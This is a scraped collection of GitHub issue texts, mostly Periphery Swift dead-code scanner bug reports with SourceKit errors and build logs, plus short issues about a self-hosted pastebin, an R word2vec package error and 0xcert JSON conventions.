    
    static func staticAction() {
        print(Alignment.self)
    }
}

It effects the `Protocol`, `Enum`, `Struct` etc... When I try to scan my project, here is the error I'm always getting:
```
SourceKit editorOpen request failed for file '/Users/arguiot/GitHub/StudIO/StudIO/Extensions/Compression.swift': Retrieving both the document structure and a syntax tree at the same time is not supported. Use the syntax tree to compute the document structure.
``` Using periphery to analyze an open-source DI project. Part of it is a command-line MacOS tool. You can get the source here : https://github.com/uber/needle/tree/master/Generator

In that `Generator` directory, please run `swift package generate-xcodeproj --xcconfig-overrides xcode.xcconfig` to create an Xcode project.

Once that's done we can run `../Periphery scan --project /Users/rudro/workspace/needle/Generator/Needle.xcodeproj --schemes needle --targets NeedleFramework` (the capital letter due to me using a local build of periphery).

Some of the warnings are great.

e.g:
`
/Users/rudro/workspace/needle/Generator/Sources/NeedleFramework/Generating/DependencyProviderContentTask.swift:22:8: warning: Struct 'PropertyNotFoundErrorInfo' is unused
`
This is indeed an unused struct.

However, there are many problematic warnings.  Let's start with just one:
`/Users/rudro/workspace/needle/Generator/Sources/NeedleFramework/Generating/DependencyProviderContentTask.swift:37:5: warning: Initializer 'init(providers:)' is unused`

It warns that this init is not used: https://github.com/uber/needle/blob/4ca57ee2bd0c34022c2de2cb0fcbd2a9cb93eb17/Generator/Sources/NeedleFramework/Generating/DependencyProviderContentTask.swift#L37

However, it's used here : https://github.com/uber/needle/blob/4ca57ee2bd0c34022c2de2cb0fcbd2a9cb93eb17/Generator/Sources/NeedleFramework/Generating/DependencyGraphExporter.swift#L79

Could you have a look and let me know if I am missing some command-line params ?  Once I get a response, I'll move down the list to the other issues.

Thanks!

p.s. you can open the project in Xcode to verify that both files are part of the `NeedleFoundation` target.
 Place a recursive function into your source, but don't call it.
periphery fails to detect that it's unused.

Example;

func recurse(_ count: UInt) {
  guard count > 0 else { return }
  recurse(count - 1)
}
 I wonder why some file might not be a part of input files?
Each scan random file causes an error. 
Output provided:

```
➜  Prjct git:(refactoring/unused) peripheryscan 
[shell] xcodebuild -version
Xcode 10.2.1
Build version 10E1001
[version] 1.5.1
[configuration]
--- # .periphery.yml
aggressive: false
diagnose: false
disable_update_check: false
format: xcode
index_exclude: []
project: null
quiet: false
report_exclude: []
retain_objc_annotated: true
retain_public: false
retain_unused_protocol_func_params: false
save_build_log: null
schemes:
- Prjct Dev
strict: false
targets:
- Prjct Dev
use_build_log: null
verbose: true
workspace: /Users/julia/Documents/Prjct/Prjct.xcworkspace/

* Inspecting project configuration...
[workspace] Loading /Users/julia/Documents/Prjct/Prjct.xcworkspace/...
[project] Loading /Users/julia/Documents/Prjct/Prjct.xcodeproj...
[project] Loading /Users/julia/Documents/Prjct/Pods/Pods.xcodeproj...
[shell] xcodebuild -workspace /Users/julia/Documents/Prjct/Prjct.xcworkspace -list -json
[shell] xcodebuild -project /Users/julia/Documents/Prjct/Prjct.xcodeproj -showBuildSettings -target Prjct Dev -configuration Debug -xcconfig /Users/julia/Documents/Prjct/Pods/Target Support Files/Pods-Prjct Dev/Pods-Prjct Dev.debug.xcconfig build
[shell] rm -rf /Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6
[shell] xcodebuild -workspace /Users/julia/Documents/Prjct/Prjct.xcworkspace -showBuildSettings -scheme Prjct Dev build test
* Building Prjct Dev...
[shell] xcodebuild -workspace /Users/julia/Documents/Prjct/Prjct.xcworkspace -scheme Prjct Dev -parallelizeTargets -derivedDataPath /Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6 build CODE_SIGNING_ALLOWED="NO" ENABLE_BITCODE="NO" SWIFT_COMPILATION_MODE="wholemodule" DEBUG_INFORMATION_FORMAT="dwarf"
* Indexing...
[arguments:'Prjct Dev'] ["-incremental", "-module-name", "PrjctApp", "-Onone", "-enable-batch-mode", "-enforce-exclusivity=checked", "-DDEBUG", "-D", "COCOAPODS", "-D", "PRJCTONESIGNAL", "-D", "PRJCTMINDBOX", "-Xcc", "-fmodule-map-file=/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Products/Debug-iphoneos/PrjctMindbox/PrjctMindbox.modulemap", "-Xcc", "-fmodule-map-file=/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Products/Debug-iphoneos/PrjctOOM/PrjctOOM.modulemap", "-sdk", "/Applications/Xcode_10_2_1.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS12.2.sdk", "-target", "armv7-apple-ios10.0", "-g", "-module-cache-path", "/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/ModuleCache.noindex", "-Xfrontend", "-serialize-debugging-options", "-application-extension", "-enable-testing", "-index-store-path", "/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Index/DataStore", "-swift-version", "5", "-Xlinker", "-rpath", "-Xlinker", "/usr/lib/swift", "-I", "/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Products/Debug-iphoneos", "-I", "/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Products/Debug-iphoneos/PrjctMindbox", "-I", "/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Products/Debug-iphoneos/PrjctOOM", "-F", "/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Products/Debug-iphoneos", "-F", "/Users/julia/Documents/Prjct/Pods/OneSignal/iOS_SDK/OneSignalSDK/Framework", "-c", "-j4", "-output-file-map", "/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Intermediates.noindex/Prjct.build/Debug-iphoneos/Prjct Dev Notifications.build/Objects-normal/armv7/Prjct Dev Notifications-OutputFileMap.json", "-parseable-output", "-serialize-diagnostics", "-emit-dependencies", "-emit-module", "-emit-module-path", "/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Intermediates.noindex/Prjct.build/Debug-iphoneos/Prjct Dev Notifications.build/Objects-normal/armv7/PrjctApp.swiftmodule", "-Xcc", "-I/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Intermediates.noindex/Prjct.build/Debug-iphoneos/Prjct\\ Dev\\ Notifications.build/swift-overrides.hmap", "-Xcc", "-iquote", "-Xcc", "/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Intermediates.noindex/Prjct.build/Debug-iphoneos/Prjct Dev Notifications.build/Prjct Dev Notifications-generated-files.hmap", "-Xcc", "-I/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Intermediates.noindex/Prjct.build/Debug-iphoneos/Prjct\\ Dev\\ Notifications.build/Prjct\\ Dev\\ Notifications-own-target-headers.hmap", "-Xcc", "-I/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Intermediates.noindex/Prjct.build/Debug-iphoneos/Prjct\\ Dev\\ Notifications.build/Prjct\\ Dev\\ Notifications-all-non-framework-target-headers.hmap", "-Xcc", "-ivfsoverlay", "-Xcc", "/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Intermediates.noindex/Prjct.build/all-product-headers.yaml", "-Xcc", "-iquote", "-Xcc", "/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Intermediates.noindex/Prjct.build/Debug-iphoneos/Prjct Dev Notifications.build/Prjct Dev Notifications-project-headers.hmap", "-Xcc", "-I/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Products/Debug-iphoneos/include", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/PrjctCommon", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/Amplitude-iOS", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/Branch", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/FBSDKCoreKit", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/FBSDKLoginKit", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/FLAnimatedImage", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/Firebase", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/FirebaseAnalyticsInterop", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/FirebaseCore", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/FirebaseInstanceID", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/FirebaseMessaging", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/GTMSessionFetcher", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/GoogleToolboxForMac", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/GoogleUtilities", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/HMSegmentedControl", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/Protobuf", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/RxCocoa", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/SDWebImage", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/nanopb", "-Xcc", "-I/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Intermediates.noindex/Prjct.build/Debug-iphoneos/Prjct\\ Dev\\ Notifications.build/DerivedSources-normal/armv7", "-Xcc", "-I/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Intermediates.noindex/Prjct.build/Debug-iphoneos/Prjct\\ Dev\\ Notifications.build/DerivedSources/armv7", "-Xcc", "-I/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Intermediates.noindex/Prjct.build/Debug-iphoneos/Prjct\\ Dev\\ Notifications.build/DerivedSources", "-Xcc", "-DDEBUG=1", "-Xcc", "-DCOCOAPODS=1", "-emit-objc-header", "-emit-objc-header-path", "/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Intermediates.noindex/Prjct.build/Debug-iphoneos/Prjct Dev Notifications.build/Objects-normal/armv7/PrjctApp-Swift.h", "-working-directory", "/Users/julia/Documents/Prjct", "/Users/julia/Documents/Prjct/Prjct Notifications/EntryPointOneSignal.swift", "/Users/julia/Documents/Prjct/Prjct Notifications/EntryPointFallback.swift", "/Users/julia/Documents/Prjct/Prjct Notifications/EntryPointRepresentable.swift", "/Users/julia/Documents/Prjct/Prjct Notifications/EntryPoint.swift", "/Users/julia/Documents/Prjct/Prjct Notifications/EntryPointWrapper.swift", "/Users/julia/Documents/Prjct/Prjct Notifications/EntryPointMindbox.swift"]
error: SourceKit index request failed for file '/Users/julia/Documents/Prjct/Prjct/Deprecated/Entities/Order/ApiListOrderPayment.swift': '/Users/julia/Documents/Prjct/Prjct/Deprecated/Entities/Order/ApiListOrderPayment.swift' is not part of the input files
➜  Prjct git:(refactoring/unused) 

``` Using periphery to analyze an open-source DI project. Part of it is a command-line MacOS tool. You can get the source here : https://github.com/uber/needle/tree/master/Generator

In that `Generator` directory, please run `swift package generate-xcodeproj --xcconfig-overrides xcode.xcconfig` to create an Xcode project.

Once that's done we can run `../Periphery scan --project /Users/rudro/workspace/needle/Generator/Needle.xcodeproj --schemes needle --targets NeedleFramework` (the capital letter due to me using a local build of periphery).

Some of the warnings are great.

e.g:
`
/Users/rudro/workspace/needle/Generator/Sources/NeedleFramework/Generating/DependencyProviderContentTask.swift:22:8: warning: Struct 'PropertyNotFoundErrorInfo' is unused
`
This is indeed an unused struct.

However, there are many problematic warnings.  Let's start with just one:
`/Users/rudro/workspace/needle/Generator/Sources/NeedleFramework/Generating/DependencyProviderContentTask.swift:37:5: warning: Initializer 'init(providers:)' is unused`

It warns that this init is not used: https://github.com/uber/needle/blob/4ca57ee2bd0c34022c2de2cb0fcbd2a9cb93eb17/Generator/Sources/NeedleFramework/Generating/DependencyProviderContentTask.swift#L37

However, it's used here : https://github.com/uber/needle/blob/4ca57ee2bd0c34022c2de2cb0fcbd2a9cb93eb17/Generator/Sources/NeedleFramework/Generating/DependencyGraphExporter.swift#L79

Could you have a look and let me know if I am missing some command-line params ?  Once I get a response, I'll move down the list to the other issues.

Thanks!

 I wonder why some file might not be a part of input files?
Each scan random file causes an error. 
Output provided:

```
➜  Prjct git:(refactoring/unused) peripheryscan 
[shell] xcodebuild -version
Xcode 10.2.1
Build version 10E1001
[version] 1.5.1
[configuration]
--- # .periphery.yml
aggressive: false
diagnose: false
disable_update_check: false
format: xcode
index_exclude: []
project: null
quiet: false
report_exclude: []
retain_objc_annotated: true
retain_public: false
retain_unused_protocol_func_params: false
save_build_log: null
schemes:
- Prjct Dev
strict: false
targets:
- Prjct Dev
use_build_log: null
verbose: true
workspace: /Users/julia/Documents/Prjct/Prjct.xcworkspace/

* Inspecting project configuration...
[workspace] Loading /Users/julia/Documents/Prjct/Prjct.xcworkspace/...
[project] Loading /Users/julia/Documents/Prjct/Prjct.xcodeproj...
[project] Loading /Users/julia/Documents/Prjct/Pods/Pods.xcodeproj...
[shell] xcodebuild -workspace /Users/julia/Documents/Prjct/Prjct.xcworkspace -list -json
[shell] xcodebuild -project /Users/julia/Documents/Prjct/Prjct.xcodeproj -showBuildSettings -target Prjct Dev -configuration Debug -xcconfig /Users/julia/Documents/Prjct/Pods/Target Support Files/Pods-Prjct Dev/Pods-Prjct Dev.debug.xcconfig build
[shell] rm -rf /Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6
[shell] xcodebuild -workspace /Users/julia/Documents/Prjct/Prjct.xcworkspace -showBuildSettings -scheme Prjct Dev build test
* Building Prjct Dev...
[shell] xcodebuild -workspace /Users/julia/Documents/Prjct/Prjct.xcworkspace -scheme Prjct Dev -parallelizeTargets -derivedDataPath /Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6 build CODE_SIGNING_ALLOWED="NO" ENABLE_BITCODE="NO" SWIFT_COMPILATION_MODE="wholemodule" DEBUG_INFORMATION_FORMAT="dwarf"
* Indexing...
[arguments:'Prjct Dev'] ["-incremental", "-module-name", "PrjctApp", "-Onone", "-enable-batch-mode", "-enforce-exclusivity=checked", "-DDEBUG", "-D", "COCOAPODS", "-D", "PRJCTONESIGNAL", "-D", "PRJCTMINDBOX", "-Xcc", "-fmodule-map-file=/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Products/Debug-iphoneos/PrjctMindbox/PrjctMindbox.modulemap", "-Xcc", "-fmodule-map-file=/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Products/Debug-iphoneos/PrjctOOM/PrjctOOM.modulemap", "-sdk", "/Applications/Xcode_10_2_1.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS12.2.sdk", "-target", "armv7-apple-ios10.0", "-g", "-module-cache-path", "/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/ModuleCache.noindex", "-Xfrontend", "-serialize-debugging-options", "-application-extension", "-enable-testing", "-index-store-path", "/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Index/DataStore", "-swift-version", "5", "-Xlinker", "-rpath", "-Xlinker", "/usr/lib/swift", "-I", "/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Products/Debug-iphoneos", "-I", "/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Products/Debug-iphoneos/PrjctMindbox", "-I", "/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Products/Debug-iphoneos/PrjctOOM", "-F", "/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Products/Debug-iphoneos", "-F", "/Users/julia/Documents/Prjct/Pods/OneSignal/iOS_SDK/OneSignalSDK/Framework", "-c", "-j4", "-output-file-map", "/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Intermediates.noindex/Prjct.build/Debug-iphoneos/Prjct Dev Notifications.build/Objects-normal/armv7/Prjct Dev Notifications-OutputFileMap.json", "-parseable-output", "-serialize-diagnostics", "-emit-dependencies", "-emit-module", "-emit-module-path", "/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Intermediates.noindex/Prjct.build/Debug-iphoneos/Prjct Dev Notifications.build/Objects-normal/armv7/PrjctApp.swiftmodule", "-Xcc", "-I/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Intermediates.noindex/Prjct.build/Debug-iphoneos/Prjct\\ Dev\\ Notifications.build/swift-overrides.hmap", "-Xcc", "-iquote", "-Xcc", "/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Intermediates.noindex/Prjct.build/Debug-iphoneos/Prjct Dev Notifications.build/Prjct Dev Notifications-generated-files.hmap", "-Xcc", "-I/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Intermediates.noindex/Prjct.build/Debug-iphoneos/Prjct\\ Dev\\ Notifications.build/Prjct\\ Dev\\ Notifications-own-target-headers.hmap", "-Xcc", "-I/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Intermediates.noindex/Prjct.build/Debug-iphoneos/Prjct\\ Dev\\ Notifications.build/Prjct\\ Dev\\ Notifications-all-non-framework-target-headers.hmap", "-Xcc", "-ivfsoverlay", "-Xcc", "/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Intermediates.noindex/Prjct.build/all-product-headers.yaml", "-Xcc", "-iquote", "-Xcc", "/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Intermediates.noindex/Prjct.build/Debug-iphoneos/Prjct Dev Notifications.build/Prjct Dev Notifications-project-headers.hmap", "-Xcc", "-I/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Products/Debug-iphoneos/include", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/PrjctCommon", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/Amplitude-iOS", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/Branch", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/FBSDKCoreKit", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/FBSDKLoginKit", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/FLAnimatedImage", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/Firebase", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/FirebaseAnalyticsInterop", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/FirebaseCore", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/FirebaseInstanceID", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/FirebaseMessaging", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/GTMSessionFetcher", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/GoogleToolboxForMac", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/GoogleUtilities", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/HMSegmentedControl", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/Protobuf", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/RxCocoa", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/SDWebImage", "-Xcc", "-I/Users/julia/Documents/Prjct/Pods/Headers/Public/nanopb", "-Xcc", "-I/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Intermediates.noindex/Prjct.build/Debug-iphoneos/Prjct\\ Dev\\ Notifications.build/DerivedSources-normal/armv7", "-Xcc", "-I/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Intermediates.noindex/Prjct.build/Debug-iphoneos/Prjct\\ Dev\\ Notifications.build/DerivedSources/armv7", "-Xcc", "-I/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Intermediates.noindex/Prjct.build/Debug-iphoneos/Prjct\\ Dev\\ Notifications.build/DerivedSources", "-Xcc", "-DDEBUG=1", "-Xcc", "-DCOCOAPODS=1", "-emit-objc-header", "-emit-objc-header-path", "/Users/julia/Library/Caches/com.peripheryapp.periphery/DerivedData-cad662947d99f378551be5a861fd12bde77711a6/Build/Intermediates.noindex/Prjct.build/Debug-iphoneos/Prjct Dev Notifications.build/Objects-normal/armv7/PrjctApp-Swift.h", "-working-directory", "/Users/julia/Documents/Prjct", "/Users/julia/Documents/Prjct/Prjct Notifications/EntryPointOneSignal.swift", "/Users/julia/Documents/Prjct/Prjct Notifications/EntryPointFallback.swift", "/Users/julia/Documents/Prjct/Prjct Notifications/EntryPointRepresentable.swift", "/Users/julia/Documents/Prjct/Prjct Notifications/EntryPoint.swift", "/Users/julia/Documents/Prjct/Prjct Notifications/EntryPointWrapper.swift", "/Users/julia/Documents/Prjct/Prjct Notifications/EntryPointMindbox.swift"]
error: SourceKit index request failed for file '/Users/julia/Documents/Prjct/Prjct/Deprecated/Entities/Order/ApiListOrderPayment.swift': '/Users/julia/Documents/Prjct/Prjct/Deprecated/Entities/Order/ApiListOrderPayment.swift' is not part of the input files
➜  Prjct git:(refactoring/unused) 

``` Error message: `Failed to determine build arguments for target 'TargetName' with module name 'TargetName'`

Can you please tell what am I missing here?
 http://openradar.appspot.com/radar?id=4950176510771200 New security and sandboxing features on macOS Catalina prevent periphery from running on the system. The app must be updated with conformance to the new security protocols in order to be allowed to run. New security and sandboxing features on macOS Catalina prevent periphery from running on the system. The app must be updated with conformance to the new security protocols in order to be allowed to run. Xcode 10.2.1
macOS 10.14.4
periphery 1.5.1

`error: SourceKit index request failed for file [redacted]: [redacted] is not part of the input files`

The error consistently presents on the same file. Please let me know if there's more information I can provide When I try to scan my project, here is the error I'm always getting:
```
SourceKit editorOpen request failed for file '/Users/arguiot/GitHub/StudIO/StudIO/Extensions/Compression.swift': Retrieving both the document structure and a syntax tree at the same time is not supported. Use the syntax tree to compute the document structure.
``` From #8:

> +1 with @Sam-Spencer 
> 
> I've just compiled the `xcode10.2` branch, and Periphery failed with the following error:
> 
> ```
> * Inspecting project configuration...
> * Building Acrostics...
> * Indexing...
> objc[30286]: __SwiftNativeNSError object 0x7f85eb111ab0 overreleased while already deallocating; break on objc_overrelease_during_dealloc_error to debug
> error: SourceKit editorOpen request failed for file '[REDACTED]': Retrieving both the document structure and a syntax tree at the same time is not supported. Use the syntax tree to compute the document structure.
> ```
> 
> This is still broken.  Hello,

If I point `xcode-select` to Xcode 10.2 beta 2, `periphery scan` indexing phase fails with error:

> error: SourceKit editorOpen request failed for file '/Users/myUser/longPath/MyClass.swift': Retrieving both the document structure and a syntax tree at the same time is not supported. Use the syntax tree to compute the document structure.

You can find the message in [SwiftEditor sources](https://github.com/apple/swift/blob/master/tools/SourceKit/lib/SwiftLang/SwiftEditor.cpp).

Please fix. Whilst running the scan command as follows:

```bash
periphery scan  --workspace "/Users/myUser/Documents/pathToWorkspace/MyWorkspace.xcworkspace/" --schemes "MyScheme"  --targets "MyTarget"  --no-retain-public
```

I encountered a connection interrupted error and was unable to proceed, here's the output:

```
sourcekit: [1:connection-event-handler:20523: 0.0000] Connection interruptsourcekit: [1:updateSemanticEditorDelay:20523: 0.0015] disabling semantic editor for 10 secondssourcekit: [1:pingService:20523: 0.0016] pinging servicesourcekit: [1:ping-event-handler:20523: 0.0107] service restorederror: SourceKit cursorInfo request failed for file '/Users/myUser/Documents/projects/pathToViewController/MyViewController.swift': Connection interrupted
* Inspecting project configuration...
* Building MyScheme...
* Indexing...
Command PhaseScriptExecution failed with a nonzero exit code
```

It looks as though this is more a bug with SourceKit than with Periphery but thought it might be worth asking whether or not this is a known issue? Thanks in advance. Error message: `Failed to determine build arguments for target 'TargetName' with module name 'TargetName'`

Can you please tell what am I missing here?
 Xcode 10.2.1
macOS 10.14.4
periphery 1.5.1

`error: SourceKit index request failed for file [redacted]: [redacted] is not part of the input files`

The error consistently presents on the same file. Please let me know if there's more information I can provide I am getting warnings for both unused `tableView` and `section` when implementing UITableViewDataSource method `tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -> Int`.  
<---------->
170029673
your demo page is not available.

If the URL has changed, please open a pull request at 
https://github.com/Kickball/awesome-selfhosted or create an issue. Thank you!

https://github.com/Kickball/awesome-selfhosted/issues/1767 Hi I'm a windows user. I can install this in my ubuntu VM but I don't see a build for windows.
I've never used rust before and the `cargo build --release` failed 

Below is the complete error if you're interested.

```error[E0554]: #![feature] may not be used on the stable release channel
   --> C:\Users\ShmuelDev\.cargo\registry\src\github.com-1ecc6299db9ec823\packed_simd-0.3.3\src\lib.rs:202:1
    |
202 | / #![feature(
203 | |     repr_simd,
204 | |     const_fn,
205 | |     platform_intrinsics,
...   |
215 | |     custom_inner_attributes
216 | | )]
    | |__^

error: aborting due to previous error

For more information about this error, try `rustc --explain E0554`.
error: Could not compile `packed_simd`.
``` your demo page is not available.

If the URL has changed, please open a pull request at 
https://github.com/Kickball/awesome-selfhosted or create an issue. Thank you!

https://github.com/Kickball/awesome-selfhosted/issues/1767 Hello,

Quick question, is there any reason you decided to use `PUT` to publish a paste and not `POST` ? Although there is no problem from the perspective of the http rfc to use `PUT` to create a new record, `POST` is more common.

Actually, whould it be possible to list all the http routes (verb + endpoint + payload + description) in the readme ? I'm not fluent with rust/rocket so I'm not confident to look for answer in the source code.

Btw, thank you for your minimalist bin, it really rocks ! :) Hello,

Quick question, is there any reason you decided to use `PUT` to publish a paste and not `POST` ? Although there is no problem from the perspective of the http rfc to use `PUT` to create a new record, `POST` is more common.

Actually, whould it be possible to list all the http routes (verb + endpoint + payload + description) in the readme ? I'm not fluent with rust/rocket so I'm not confident to look for answer in the source code.

Btw, thank you for your minimalist bin, it really rocks ! :)
<---------->
170105181
word2vecの学習のパラメータが、min_count=5になっているので、
min_count5未満の単語しか含まない文書があると、
document_vector functionでhitする単語がないとerrorになるようです。

----------

dv <- scdv::scdv(doc, k, dimension, word2vec_args = list(show_by=25))

Starting training using file /private/var/folders/hw/r48dgy053vg85t7lp_6rfgyw0000gp/T/Rtmprifjrb/file92f22d56c7b6
Vocab size: 1016
Words in train file: 42845
Filename ends with .bin, so reading in binary format
Reading a word2vec binary file of 1016 rows and 30 columns
  |===========================================================| 100%
 colSums(wtv[.x[.x %in% word], ]) でエラー: 
  'x' must be an array of at least two dimensions


<---------->
170149661
I think conventions are the most important part of 0xcert's extensibility. Let's encourage people to edit this by making it easier to edit. This can be like Ethereum's EIPs repo.

I could implement this. Proposing an opaque BLOB convention. 

```json
{
  "$schema": "http://json-schema.org/draft-07/schema",
  "description": "An opaque binary file.",
  "properties": {
    "$evidence": {
      "description": "A URI pointing to the evidence JSON with data needed to certify this asset.",
      "type": "string"
    },
    "$schema": {
      "description": "A path to JSON Schema definition file.",
      "type": "string"
    },
    "mediatype": {
      "description": "Formerly named MIME types. Reference: https://www.iana.org/assignments/media-types/media-types.xhtml",
      "type": "string"
    },
    "base64data": {
      "description": "A base-64 encoded data object.",
      "type": "string"
    },
  },
  "title": "Asset",
  "type": "object",
  "required": ["$schema", "base64data"]
}
```


Notes:

- https://stackoverflow.com/questions/1443158/binary-data-in-json-string-something-better-than-base64 Currently conventions are hosted at

https://github.com/0xcert/framework/tree/master/conventions

But it seems that conventions are outside the scope of the framework. PRs for new conventions should not be hitting against the framework repo. They should be hitting here. This this a compiled version of https://github.com/0xcert/framework/tree/master/conventions

If so how is it compiled?
<---------->
170195306
